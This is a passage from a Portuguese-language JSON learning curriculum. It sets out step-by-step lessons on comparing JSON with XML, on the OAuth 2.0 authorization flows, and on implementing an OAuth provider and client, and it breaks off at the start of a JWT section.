                              "practicalExample": "Em um serviço web de e-commerce, parseie um XML de pedido recebido via SOAP (ex: <order><items><item id='1' qty='2'/></items></order>), extraia itens com DOM, valide quantidades com SAX para performance, modifique adicionando frete e retorne XML atualizado para o cliente.",
                              "finalVerifications": [
                                "Parseia XMLs complexos com namespaces sem erros.",
                                "Modifica e salva XML preservando estrutura original.",
                                "Compara performance DOM vs SAX em arquivos grandes.",
                                "Integra parsing em endpoint web funcional.",
                                "Trata exceções e valida input corretamente.",
                                "Extrai dados para objetos Java/.NET e vice-versa."
                              ],
                              "assessmentCriteria": [
                                "Precisão na navegação e extração de dados XML (100% match).",
                                "Eficiência: SAX/StAX usado adequadamente para large files.",
                                "Robustez: Lida com XML malformado e edge cases.",
                                "Código limpo: Bem documentado, com error handling.",
                                "Integração: Funciona em contexto web/service sem vazamentos.",
                                "Performance: Tempo de parsing < 1s para 10MB XML."
                              ],
                              "crossCurricularConnections": [
                                "Web Services (SOAP/REST com XML payloads)",
                                "Banco de Dados (Export/Import XML para SQL)",
                                "Segurança da Informação (Validação XML contra ataques XXE)",
                                "Desenvolvimento Full-Stack (Integração frontend XML/JSON)",
                                "Big Data (Processamento streaming similar a JSON parsers)"
                              ],
                              "realWorldApplication": "Em sistemas empresariais como ERP/SAP, bancos usam XML para integração B2B (ex: faturas eletrônicas NFe no Brasil), parseando payloads em APIs para automação de processos, relatórios e compliance regulatório."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.3",
                            "name": "Comparar JSON e XML em comunicações web",
                            "description": "Analisar vantagens e desvantagens de JSON (leve, rápido) versus XML (estruturado, verbose), identificando contextos ideais como APIs modernas (JSON) versus enterprise legados (XML/SOAP).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender as Definições e Sintaxe Básica de JSON e XML",
                                  "subSteps": [
                                    "Leia a definição oficial de JSON no site json.org e identifique que é um formato leve de troca de dados baseado em pares chave-valor.",
                                    "Acesse a documentação W3C de XML e note que é uma linguagem de marcação extensível com tags hierárquicas e atributos.",
                                    "Escreva um exemplo simples de JSON (ex: {\"nome\": \"João\", \"idade\": 30}) e um equivalente em XML (<pessoa><nome>João</nome><idade>30</idade></pessoa>).",
                                    "Compare visualmente o tamanho e legibilidade dos dois exemplos.",
                                    "Instale uma ferramenta online como JSONLint e XML Validator para validar seus exemplos."
                                  ],
                                  "verification": "Você tem exemplos válidos de JSON e XML salvos e validados sem erros.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Site json.org",
                                    "W3C XML Specification",
                                    "Editor de texto (VS Code)",
                                    "JSONLint e XML Validator online"
                                  ],
                                  "tips": "Comece com exemplos mínimos para evitar sobrecarga; foque na hierarquia de dados.",
                                  "learningObjective": "Diferenciar JSON como formato de dados chave-valor de XML como markup hierárquico.",
                                  "commonMistakes": [
                                    "Confundir JSON com JavaScript objetos completos (JSON é subconjunto); usar tags não fechadas em XML."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Estrutura, Parsing e Desempenho",
                                  "subSteps": [
                                    "Pesquise e anote diferenças em parsing: JSON usa parsers nativos leves (JSON.parse() em JS), XML requer parsers mais complexos (DOM, SAX).",
                                    "Meça o tamanho de arquivos: crie payloads de 10 objetos em JSON e XML, compare bytes usando ferramentas como file size checker.",
                                    "Teste velocidade de parsing com ferramentas online (JSON vs XML parser benchmarks).",
                                    "Identifique suporte a namespaces e schemas: XML tem suporte nativo, JSON usa bibliotecas externas.",
                                    "Registre métricas: tempo de parse, uso de memória para payloads médios."
                                  ],
                                  "verification": "Tabela comparativa com métricas de tamanho, parse time e memória criada e salva.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "VS Code ou Postman para payloads",
                                    "Ferramentas online: JSON vs XML Benchmark (jsperf.com)",
                                    "Bibliotecas de teste: Node.js para JSON.parse e xml2js"
                                  ],
                                  "tips": "Use payloads reais de APIs públicas para testes autênticos; normalize dados para comparação justa.",
                                  "learningObjective": "Compreender impactos de estrutura em performance de parsing e transmissão.",
                                  "commonMistakes": [
                                    "Ignorar overhead de headers em XML; testar apenas com dados minúsculos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Listar Vantagens, Desvantagens e Trade-offs",
                                  "subSteps": [
                                    "Crie uma tabela de vantagens JSON: leve, rápido, humano-legível, nativo em JS.",
                                    "Adicione desvantagens JSON: sem suporte nativo a comentários, schemas opcionais.",
                                    "Liste vantagens XML: validade com schemas (XSD), namespaces, auto-descritivo.",
                                    "Registre desvantagens XML: verboso, lento, propenso a erros de tag.",
                                    "Discuta trade-offs: JSON para velocidade vs XML para robustez em enterprise.",
                                    "Priorize por cenários: mobile/API (JSON) vs integrações legadas (XML)."
                                  ],
                                  "verification": "Tabela completa com pelo menos 4 prós/contras por formato, revisada por pares ou auto-checagem.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Markdown table",
                                    "Artigos: 'JSON vs XML' no Stack Overflow ou Medium"
                                  ],
                                  "tips": "Use bullet points para clareza; baseie em evidências de benchmarks do step anterior.",
                                  "learningObjective": "Avaliar prós e contras quantitativamente e qualitativamente.",
                                  "commonMistakes": [
                                    "Ser tendencioso sem dados; ignorar evoluções como JSON Schema."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Contextos Ideais de Uso em Comunicações Web",
                                  "subSteps": [
                                    "Analise APIs modernas: REST/JSON (ex: Twitter API, GitHub).",
                                    "Estude sistemas legados: SOAP/XML (ex: serviços bancários enterprise).",
                                    "Crie fluxograma de decisão: dados leves/mobile? -> JSON; validação rígida? -> XML.",
                                    "Pesquise tendências: estatísticas de adoção (JSON >90% em APIs públicas).",
                                    "Simule escolha: para uma app de delivery, justifique JSON; para ERP, XML."
                                  ],
                                  "verification": "Fluxograma e 3 cenários com justificativas documentadas.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Postman para testar APIs reais",
                                    "Documentos: REST vs SOAP comparisons",
                                    "Ferramenta de fluxograma: Draw.io"
                                  ],
                                  "tips": "Considere custo de manutenção e ecossistema (bibliotecas JSON ubíquas).",
                                  "learningObjective": "Aplicar comparação a cenários reais de web services.",
                                  "commonMistakes": [
                                    "Generalizar sem contexto; ignorar híbridos como JSON/XML em GraphQL."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce para app mobile, use JSON para enviar pedido {\"produto\": \"celular\", \"preco\": 1500, \"quantidade\": 1} – leve e rápido. No sistema legado SOAP do banco parceiro, use XML <pedido><produto>celular</produto><preco>1500</preco><quantidade>1</quantidade></pedido> para validação XSD obrigatória.",
                              "finalVerifications": [
                                "Explique 3 diferenças chave em parsing e performance.",
                                "Forneça exemplo de quando escolher JSON sobre XML.",
                                "Crie tabela de prós/contras com evidências.",
                                "Descreva fluxograma de decisão para formatos.",
                                "Compare tamanhos de payloads reais.",
                                "Justifique uso em REST vs SOAP."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na lista de vantagens/desvantagens (80% cobertura).",
                                "Uso de evidências quantitativas (benchmarks, tamanhos).",
                                "Relevância de exemplos e contextos (alinhados a web services).",
                                "Clareza na comunicação (tabelas, fluxogramas legíveis).",
                                "Profundidade em trade-offs e tendências atuais.",
                                "Ausência de erros factuais em sintaxe ou definições."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Impacto em protocolos HTTP/SOAP.",
                                "Programação: Parsing e manipulação de dados em linguagens como JS/Python.",
                                "Banco de Dados: Troca de dados em APIs relacionais/NoSQL.",
                                "Segurança da Informação: Validação schemas em XML vs JSON.",
                                "Gestão de Projetos: Escolha de formatos para escalabilidade."
                              ],
                              "realWorldApplication": "Ao desenvolver APIs REST para apps web/mobile, priorize JSON para performance; em integrações enterprise com sistemas legados como SAP ou bancos, use XML/SOAP para conformidade e validação robusta, reduzindo erros em transações financeiras."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.3.2.1",
                              "10.1.3.3.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.4",
                    "name": "Autenticação e Segurança em APIs",
                    "description": "Mecanismos como OAuth, JWT e HTTPS para proteger serviços web.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.4.1",
                        "name": "OAuth 2.0",
                        "description": "Protocolo aberto de autorização delegada que permite que aplicações acessem recursos protegidos em nome de usuários sem compartilhar credenciais, utilizando fluxos como Authorization Code e Client Credentials.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.1.1",
                            "name": "Compreender os fluxos de autorização OAuth 2.0",
                            "description": "Identificar e explicar os principais fluxos de OAuth 2.0, como Authorization Code Flow, Implicit Flow e Client Credentials Flow, incluindo roles de cliente, servidor de autorização e servidor de recursos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Conceitos Fundamentais e Roles em OAuth 2.0",
                                  "subSteps": [
                                    "Estude a definição de OAuth 2.0 como framework de autorização delegado.",
                                    "Identifique os quatro roles principais: Resource Owner (dono do recurso), Client (aplicação cliente), Authorization Server (servidor de autorização) e Resource Server (servidor de recursos).",
                                    "Compreenda conceitos chave como scopes, tokens de acesso, refresh tokens e redirecionamentos.",
                                    "Analise o diagrama geral de OAuth 2.0 da RFC 6749.",
                                    "Explique a diferença entre autenticação e autorização no contexto OAuth."
                                  ],
                                  "verification": "Liste e descreva corretamente os quatro roles e três conceitos chave sem erros.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "RFC 6749 (OAuth 2.0 oficial)",
                                    "Vídeo introdutório no YouTube sobre OAuth basics",
                                    "Diagrama oficial de fluxos OAuth"
                                  ],
                                  "tips": "Use diagramas visuais para memorizar as interações entre roles.",
                                  "learningObjective": "Dominar os papéis e termos fundamentais de OAuth 2.0.",
                                  "commonMistakes": [
                                    "Confundir Resource Owner com Client",
                                    "Ignorar a distinção entre access token e refresh token",
                                    "Achar que OAuth é apenas para autenticação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Authorization Code Flow",
                                  "subSteps": [
                                    "Descreva os passos: 1) Client redireciona usuário para AS; 2) Usuário autentica e aprova scopes; 3) AS redireciona com code; 4) Client troca code por token no AS; 5) Client acessa RS com token.",
                                    "Explique o papel do 'state parameter' para prevenir CSRF.",
                                    "Entenda por que é o flow mais seguro (tokens não expostos no browser).",
                                    "Simule o fluxo com um diagrama desenhado à mão.",
                                    "Identifique cenários de uso: apps web server-side."
                                  ],
                                  "verification": "Desenhe e explique o fluxo completo com todos os passos e parâmetros.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação OAuth 2.0 Authorization Code Flow",
                                    "Ferramenta como draw.io para diagramas",
                                    "Exemplo prático em Postman"
                                  ],
                                  "tips": "Sempre inclua o 'state' parameter em exemplos reais para segurança.",
                                  "learningObjective": "Explicar e diagramar o Authorization Code Flow com precisão.",
                                  "commonMistakes": [
                                    "Esquecer o backend exchange de code por token",
                                    "Não mencionar PKCE para apps públicos",
                                    "Confundir com Implicit Flow"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implicit Flow",
                                  "subSteps": [
                                    "Descreva os passos: 1) Client redireciona para AS; 2) Usuário aprova; 3) AS retorna token diretamente na URL fragment.",
                                    "Explique por que é para SPAs (Single Page Apps) sem backend.",
                                    "Discuta desvantagens: token exposto no browser, deprecated no OAuth 2.1.",
                                    "Compare com Authorization Code + PKCE como alternativa moderna.",
                                    "Simule em um ambiente de teste browser-based."
                                  ],
                                  "verification": "Explique por que o Implicit Flow é inseguro e liste 3 riscos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "RFC 6749 seção Implicit Grant",
                                    "Artigo sobre depreciação do Implicit Flow",
                                    "Exemplo em JSFiddle ou CodePen"
                                  ],
                                  "tips": "Evite usar Implicit em novos projetos; prefira Authorization Code com PKCE.",
                                  "learningObjective": "Compreender limitações e uso histórico do Implicit Flow.",
                                  "commonMistakes": [
                                    "Achar que Implicit é mais simples e seguro",
                                    "Não notar que tokens vão no fragment (não no query string)",
                                    "Ignorar sua depreciação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Client Credentials Flow e Comparação",
                                  "subSteps": [
                                    "Descreva Client Credentials: 1) Client autentica diretamente no AS com client_id/secret; 2) Recebe token para acessar RS.",
                                    "Explique uso: machine-to-machine, sem usuário envolvido.",
                                    "Compare os três flows: tabela com security, uso, steps.",
                                    "Discuta escolhas baseadas em cenários (confidencial vs público client).",
                                    "Crie uma tabela de decisão para escolher flows."
                                  ],
                                  "verification": "Preencha uma tabela comparativa correta dos três flows.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "RFC 6749 Client Credentials Grant",
                                    "Tabela comparativa de fluxos OAuth (OAuth.net)",
                                    "Ferramenta Google Sheets para tabela"
                                  ],
                                  "tips": "Use Client Credentials só para serviços confiáveis, nunca expostos publicamente.",
                                  "learningObjective": "Diferenciar e selecionar flows adequados por cenário.",
                                  "commonMistakes": [
                                    "Usar Client Credentials com usuários humanos",
                                    "Expor client_secret em apps frontend",
                                    "Não comparar security levels"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de e-commerce, implemente login via Google usando Authorization Code Flow: o usuário clica 'Login com Google', é redirecionado, aprova, volta com code, backend troca por token e acessa dados do usuário no Google API.",
                              "finalVerifications": [
                                "Diagramar qualquer um dos três flows sem erros.",
                                "Explicar roles em um fluxo específico.",
                                "Identificar quando usar cada flow.",
                                "Listar 3 diferenças chave entre Authorization Code e Implicit.",
                                "Descrever riscos de segurança de cada flow.",
                                "Criar tabela comparativa funcional."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sequência de passos dos flows (90% correto).",
                                "Correta identificação e explicação de roles e parâmetros.",
                                "Compreensão de contextos de uso e segurança.",
                                "Uso de diagramas claros e legíveis.",
                                "Capacidade de comparar flows em tabela.",
                                "Identificação de erros comuns e mitigações."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação (tokens, CSRF, PKCE).",
                                "Desenvolvimento Web (APIs REST, SPAs).",
                                "Redes de Computadores (HTTP redirects, HTTPS).",
                                "Criptografia (JWT tokens, signing).",
                                "Banco de Dados (armazenamento seguro de refresh tokens)."
                              ],
                              "realWorldApplication": "OAuth 2.0 é usado em logins federados como 'Login com Google/Facebook' em apps como Spotify, GitHub APIs para integrações CI/CD, e serviços B2B como Stripe para pagamentos autorizados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.2",
                            "name": "Implementar um provedor OAuth 2.0",
                            "description": "Configurar um servidor OAuth 2.0 usando bibliotecas como Spring Security OAuth ou Auth0, incluindo registro de clientes, geração de tokens de acesso e refresh tokens.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de desenvolvimento e adicionar dependências",
                                  "subSteps": [
                                    "Instalar JDK 17+ e um IDE como IntelliJ ou Eclipse.",
                                    "Criar um novo projeto Spring Boot via Spring Initializr com dependências: Spring Web, Spring Security, Spring Security OAuth2.",
                                    "Adicionar configurações no pom.xml para spring-security-oauth2-autoconfigure.",
                                    "Configurar application.properties com portas e banco de dados em memória (H2 para testes).",
                                    "Executar o projeto para verificar inicialização sem erros."
                                  ],
                                  "verification": "Projeto inicia sem erros de dependências e endpoints básicos respondem.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Spring Initializr",
                                    "JDK 17+",
                                    "IDE (IntelliJ/Eclipse)",
                                    "H2 Database driver"
                                  ],
                                  "tips": "Use Spring Boot starters para evitar configurações manuais excessivas.",
                                  "learningObjective": "Entender as dependências necessárias para um provedor OAuth 2.0 em Spring.",
                                  "commonMistakes": [
                                    "Versão incompatível de Spring Boot/Security",
                                    "Esquecer de adicionar oauth2-autoconfigure"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar classes de segurança e autorização básica",
                                  "subSteps": [
                                    "Criar uma classe UserDetailsService para autenticação de usuários.",
                                    "Implementar uma classe que estenda AuthorizationServerConfigurerAdapter.",
                                    "Configurar in-memory clients e users no configure method.",
                                    "Definir clientId, secret, scopes e grant types (authorization_code, refresh_token).",
                                    "Habilitar @EnableAuthorizationServer na classe principal."
                                  ],
                                  "verification": "Endpoints /oauth/authorize e /oauth/token estão acessíveis via Postman.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Spring Security OAuth2 docs",
                                    "Postman para testes iniciais"
                                  ],
                                  "tips": "Use BCryptPasswordEncoder para hashear senhas de clients.",
                                  "learningObjective": "Configurar o framework OAuth 2.0 com autenticação básica.",
                                  "commonMistakes": [
                                    "Grant types incorretos",
                                    "Scopes não definidos",
                                    "Falta de @EnableWebSecurity"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar registro de clientes OAuth",
                                  "subSteps": [
                                    "Criar um endpoint REST para registrar novos clients (POST /clients).",
                                    "Gerar clientId único e clientSecret hashed.",
                                    "Armazenar clients em um banco (JDBC ou JPA com entidade ClientDetails).",
                                    "Implementar validação de inputs (redirect URIs, scopes).",
                                    "Integrar com AuthorizationServer para usar clients dinâmicos."
                                  ],
                                  "verification": "Novo client registrado retorna clientId/secret e é utilizável em /oauth/token.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Spring Data JPA",
                                    "Entidade ClientDetails",
                                    "Postman"
                                  ],
                                  "tips": "Valide redirect URIs contra lista permitida para segurança.",
                                  "learningObjective": "Gerenciar clients dinamicamente em um provedor OAuth.",
                                  "commonMistakes": [
                                    "Não hashear clientSecret",
                                    "Permitir URIs arbitrárias",
                                    "Falta de unique clientId"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar geração de tokens de acesso e refresh",
                                  "subSteps": [
                                    "Estender ResourceServerConfigurerAdapter para proteger recursos.",
                                    "Configurar tokenStore como JdbcTokenStore ou InMemoryTokenStore.",
                                    "Implementar token endpoint com support para refresh_token grant.",
                                    "Definir expiration times: accessToken 3600s, refreshToken 86400s.",
                                    "Adicionar suporte a JWT se necessário via JwtTokenConverter."
                                  ],
                                  "verification": "Solicitação de token retorna access_token e refresh_token válidos; refresh funciona.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "OAuth 2.0 RFC docs",
                                    "Spring OAuth TokenStore examples"
                                  ],
                                  "tips": "Teste refresh token imediatamente após obter access token.",
                                  "learningObjective": "Gerenciar ciclo de vida de tokens OAuth 2.0.",
                                  "commonMistakes": [
                                    "Expiration times muito longos",
                                    "Não revogar tokens antigos",
                                    "Falta de token revocation endpoint"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e validar o provedor OAuth completo",
                                  "subSteps": [
                                    "Usar Postman para fluxo authorization_code: redirect para /authorize, callback com code, exchange por token.",
                                    "Testar refresh_token para novo access_token.",
                                    "Verificar proteção de recursos com Bearer token.",
                                    "Simular ataques: invalid client, expired token, invalid scope.",
                                    "Implementar logout/revocation endpoint."
                                  ],
                                  "verification": "Todos fluxos OAuth passam; logs mostram tokens gerados/revogados corretamente.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Postman Collection for OAuth",
                                    "Browser para authorize flow"
                                  ],
                                  "tips": "Registre logs detalhados em token endpoints para debugging.",
                                  "learningObjective": "Validar implementação contra especificação OAuth 2.0.",
                                  "commonMistakes": [
                                    "Ignorar CSRF em authorize",
                                    "Não validar state parameter",
                                    "Tokens reutilizáveis"
                                  ]
                                }
                              ],
                              "practicalExample": "Implemente um provedor OAuth para uma API de blog onde apps mobile/desktop se registram como clients, usuários logam via formulário, obtém access_token para postar artigos e refresh_token para sessões longas.",
                              "finalVerifications": [
                                "Fluxo authorization_code completa com token válido.",
                                "Refresh token gera novo access token sem reautenticação.",
                                "Recursos protegidos rejeitam requests sem/ inválidos tokens.",
                                "Clients não registrados são rejeitados.",
                                "Tokens expiram e são revogados corretamente.",
                                "Logs auditam todas as emissões de tokens."
                              ],
                              "assessmentCriteria": [
                                "Código modular e comentado com security best practices.",
                                "Todos grant types configurados conforme spec OAuth 2.0.",
                                "Tratamento de erros HTTP adequados (401, 403, etc.).",
                                "Persistência de clients/tokens em banco real (não só in-memory).",
                                "Testes unitários para endpoints chave (>70% coverage).",
                                "Documentação de client registration e fluxos."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Uso de JWT e hashing (Segurança da Informação).",
                                "Banco de Dados: Modelagem de clients/tokens (SGBD).",
                                "Desenvolvimento Web: REST APIs e Spring Boot (Dev Web).",
                                "Redes: HTTPS obrigatório para tokens (Redes de Computadores).",
                                "Ética: Privacidade em autenticação (Governança de TI)."
                              ],
                              "realWorldApplication": "Provedores como Auth0, Okta ou Google OAuth usam isso para permitir login federado em apps como Spotify, onde terceiros integram autenticação segura sem gerenciar senhas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.3",
                            "name": "Integrar OAuth em uma API cliente",
                            "description": "Desenvolver um cliente que solicite autorização via OAuth 2.0, gerencie tokens e faça chamadas autenticadas a APIs protegidas, lidando com expiração e renovação de tokens.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Aplicativo OAuth no Provedor",
                                  "subSteps": [
                                    "Escolha um provedor OAuth 2.0, como GitHub OAuth Apps, e acesse o painel de desenvolvedor.",
                                    "Crie uma nova aplicação OAuth, definindo nome, URL da homepage (ex: http://localhost:3000) e Authorization callback URL (ex: http://localhost:3000/callback).",
                                    "Registre os dados e obtenha o Client ID e Client Secret.",
                                    "Configure os scopes necessários (ex: 'user repo' para acesso a repositórios).",
                                    "Teste a configuração salvando e verificando no dashboard."
                                  ],
                                  "verification": "Confirme no dashboard do provedor que Client ID, Secret e callback URL estão corretos e scopes salvos.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Conta no provedor OAuth (ex: GitHub)",
                                    "Navegador web"
                                  ],
                                  "tips": [
                                    "Use URLs de localhost para desenvolvimento local.",
                                    "Armazene Client Secret em variáveis de ambiente, nunca no código.",
                                    "Verifique compatibilidade com fluxos OAuth suportados (ex: Authorization Code)"
                                  ],
                                  "learningObjective": "Entender o processo de registro e configuração inicial de um cliente OAuth em um provedor externo.",
                                  "commonMistakes": [
                                    "Definir callback URL incorreto levando a erros 404.",
                                    "Esquecer de selecionar scopes adequados.",
                                    "Expor Client Secret publicamente."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar o Fluxo de Solicitação de Autorização",
                                  "subSteps": [
                                    "Instale um framework web e bibliotecas (ex: Node.js com Express e Axios: npm init -y; npm i express axios).",
                                    "Crie uma rota de início de autenticação (ex: GET /auth/github) que construa a URL de autorização com parâmetros: client_id, redirect_uri, scope, state (para CSRF).",
                                    "Redirecione o usuário para a URL de autorização do provedor.",
                                    "Implemente geração de state aleatório para proteção CSRF.",
                                    "Configure servidor local para escutar na porta correta (ex: 3000)."
                                  ],
                                  "verification": "Acessando /auth/github, o navegador redireciona corretamente para a página de login do provedor com parâmetros corretos na URL.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Node.js instalado",
                                    "Editor de código (VS Code)",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "Sempre inclua parâmetro 'state' para prevenir ataques CSRF.",
                                    "Use query strings para parâmetros OAuth.",
                                    "Teste em modo incógnito para evitar cache."
                                  ],
                                  "learningObjective": "Construir e iniciar o fluxo Authorization Code, gerenciando redirecionamentos iniciais.",
                                  "commonMistakes": [
                                    "Parâmetros de URL malformados causando rejeição do provedor.",
                                    "Ausência de state levando a vulnerabilidades CSRF.",
                                    "Porta ou redirect_uri inconsistentes."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerenciar Callback e Troca de Code por Token",
                                  "subSteps": [
                                    "Crie rota de callback (ex: GET /callback) para capturar code e state da query string.",
                                    "Valide o state recebido contra o gerado anteriormente.",
                                    "Faça requisição POST para /token endpoint do provedor com code, client_id, client_secret, redirect_uri e grant_type=authorization_code.",
                                    "Parse a resposta JSON para obter access_token e refresh_token.",
                                    "Armazene tokens de forma segura (ex: em memória ou session para demo; use DB/encrypted storage em prod)."
                                  ],
                                  "verification": "Após login no provedor, callback recebe code, troca por token e armazena sem erros.",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Biblioteca HTTP client (Axios)",
                                    "Variáveis de ambiente para secrets"
                                  ],
                                  "tips": [
                                    "Use HTTPS em produção para segurança.",
                                    "Log requisições para debug, mas não tokens.",
                                    "Trate erros HTTP 400/401 do endpoint /token."
                                  ],
                                  "learningObjective": "Implementar troca segura de código de autorização por tokens de acesso.",
                                  "commonMistakes": [
                                    "Não validar state no callback.",
                                    "Enviar grant_type incorreto.",
                                    "Armazenar tokens em localStorage sem criptografia."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Realizar Chamadas Autenticadas e Gerenciar Renovação de Tokens",
                                  "subSteps": [
                                    "Crie função para chamadas API usando access_token no header Authorization: Bearer <token>.",
                                    "Implemente detecção de expiração (verifique expires_in ou timestamp).",
                                    "Ao receber 401, use refresh_token para POST /token com grant_type=refresh_token.",
                                    "Atualize access_token e refresh_token na resposta.",
                                    "Crie rota protegida (ex: /user/repos) que chama API do provedor."
                                  ],
                                  "verification": "Chamada autenticada retorna dados do usuário/repos; simule expiração e confirme refresh automático.",
                                  "estimatedTime": "1.5-2 horas",
                                  "materials": [
                                    "Documentação da API do provedor (ex: GitHub API)"
                                  ],
                                  "tips": [
                                    "Use interceptors em libs como Axios para auto-refresh.",
                                    "Defina TTL para tokens em cache.",
                                    "Teste com ferramentas como Postman para simular 401."
                                  ],
                                  "learningObjective": "Integrar tokens em requisições HTTP e automatizar renovação para sessões persistentes.",
                                  "commonMistakes": [
                                    "Não incluir 'Bearer' no header.",
                                    "Ignorar refresh_token na resposta inicial.",
                                    "Loop infinito em refresh falhado."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Lidar com Erros Completos",
                                  "subSteps": [
                                    "Teste fluxo end-to-end: auth -> callback -> API call -> expiração -> refresh.",
                                    "Simule erros: code inválido, token expirado, rede falha.",
                                    "Implemente logging e tratamento de exceções.",
                                    "Verifique segurança: scopes limitados, tokens não expostos.",
                                    "Documente o código com comentários."
                                  ],
                                  "verification": "Todos os testes passam sem vazamento de tokens ou falhas críticas.",
                                  "estimatedTime": "45 minutos - 1 hora",
                                  "materials": [
                                    "Ferramentas de teste (Postman, Jest)",
                                    "Browser dev tools"
                                  ],
                                  "tips": [
                                    "Use mocks para endpoints OAuth em testes unitários.",
                                    "Monitore console para leaks.",
                                    "Considere PKCE para clients públicos."
                                  ],
                                  "learningObjective": "Garantir robustez do cliente OAuth com testes abrangentes e tratamento de falhas.",
                                  "commonMistakes": [
                                    "Não testar refresh com refresh_token expirado.",
                                    "Expor tokens em logs.",
                                    "Scopes excessivos."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolver um cliente Node.js/Express que integra OAuth 2.0 com GitHub: usuário clica 'Login com GitHub', autoriza, app obtém token, lista repositórios privados e renova token automaticamente ao expirar, exibindo dados em uma página web.",
                              "finalVerifications": [
                                "Fluxo completo: redirecionamento, callback, token obtido e usado em API call bem-sucedida.",
                                "Renovação de token funciona após simulação de expiração (ex: aguardar expires_in).",
                                "Tratamento de erros: 401 triggers refresh, inválido code falha graciosamente.",
                                "State CSRF protegido: mismatch rejeita callback.",
                                "Tokens não expostos em URLs ou logs.",
                                "Scopes respeitados: app acessa apenas repositórios, não deleta.",
                                "Servidor roda localmente sem crashes."
                              ],
                              "assessmentCriteria": [
                                "Código modular com funções separadas para auth, token exchange e API calls.",
                                "Segurança: secrets em env vars, state validation, HTTPS recomendado.",
                                "Gerenciamento robusto de tokens: storage seguro, auto-refresh.",
                                "Tratamento completo de erros HTTP e OAuth-specific.",
                                "Testes end-to-end documentados e funcionais.",
                                "Comentários claros explicando OAuth flows."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: conceitos de tokens, scopes e prevenção de CSRF.",
                                "Desenvolvimento Web: manipulação de HTTP requests/responses e redirecionamentos.",
                                "Banco de Dados: persistência segura de tokens em sessões ou Redis.",
                                "Testes de Software: unitários e integração para fluxos OAuth.",
                                "Arquitetura de Software: padrões client-server e stateless auth."
                              ],
                              "realWorldApplication": "Aplicações como clientes mobile/desktop (ex: apps que integram Spotify para playlists pessoais, Google Drive para sync de arquivos) ou dashboards web que acessam APIs de terceiros como Twitter/X, GitHub ou Stripe para automações seguras sem senhas compartilhadas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.2",
                        "name": "JSON Web Tokens (JWT)",
                        "description": "Padrão para tokens compactos, auto-contidos e assinados digitalmente, usados para autenticação stateless em APIs, contendo claims como usuário, expiração e permissões.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.2.1",
                            "name": "Estruturar e decodificar um JWT",
                            "description": "Analisar a estrutura de um JWT (Header, Payload, Signature), decodificar payloads e identificar claims padrão como iss, sub, aud, exp e iat usando ferramentas como jwt.io.",
                            "atomicExpansion": {
                              "steps": [
                                {
